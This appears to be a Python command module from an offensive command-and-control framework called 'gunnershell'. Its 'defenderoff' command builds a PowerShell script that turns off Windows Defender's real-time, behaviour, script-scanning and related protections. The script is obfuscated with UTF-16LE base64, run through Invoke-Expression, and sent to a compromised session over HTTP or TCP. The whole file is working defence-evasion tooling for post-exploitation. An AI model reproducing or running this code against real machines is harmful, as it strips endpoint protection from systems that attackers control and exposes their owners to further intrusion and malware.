from core.gunnershell.commands.base import register, Command
from core.session_handlers import session_manager
import base64

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("defenderoff")
class DefenderoffCommand(Command):
	"""Disable Windows Defender: defenderoff"""

	@property
	def help(self):
		return "defenderoff    Disable Defender"

	def execute(self, args):
		out = self.logic(self.gs.sid, self.gs.os_type, op_id=self.op_id)
		if out:
			print(brightgreen + out)

	def logic(self, sid, os_type, op_id="console"):
		"""
		Disable Windows Defender using an obfuscated, base64-encoded PowerShell one‑liner.
		"""
		display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
		if "windows" not in os_type:
			return brightyellow + "[*] defenderoff only supported on Windows"

		# this PS snippet turns off key Defender features
		raw_ps = f"""
try {{
	$ErrorActionPreference = \"SilentlyContinue\"
	$real = (Set-MpPreference -DisableRealtimeMonitoring $true)
	$bee = (Set-MpPreference -DisableBehaviorMonitoring $true)
	$first = (Set-MpPreference -DisableBlockAtFirstSeen $true)
	$iopro = (Set-MpPreference -DisableIOAVProtection $true)
	$scscan = (Set-MpPreference -DisableScriptScanning $true)

	if (($real) -or ($bee) -or ($first) -or (iopro) -or ($scscan)) {{
		Write-Output "Good Job"
	}} else {{ Write-Output "Nothing Found" }}

}} catch {{ Write-Output "Nothing Found" }}
"""
		# obfuscate via UTF-16LE + Base64
		b64 = base64.b64encode(raw_ps.encode('utf-16le')).decode()
		ps_cmd = (
			"[Text.Encoding]::Unicode.GetString"
			"([Convert]::FromBase64String(\"" + b64 + "\")) | Invoke-Expression"
		)

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + f"[!] No such session: {display}"

		transport = sess.transport.lower()

		if transport in ("http", "https"):
			out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)

		elif transport in ("tcp", "tls"):
			out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=1.0, portscan_active=True, op_id=op_id)

		else:
			return brightred + "[!] Unknown session transport!"

		if out:
			if "Nothing Found" in out:
				return brightred + "[!] Failed to disable defender!"

			elif "Good Job" in out:
				return "[+] Successfully disabled defender."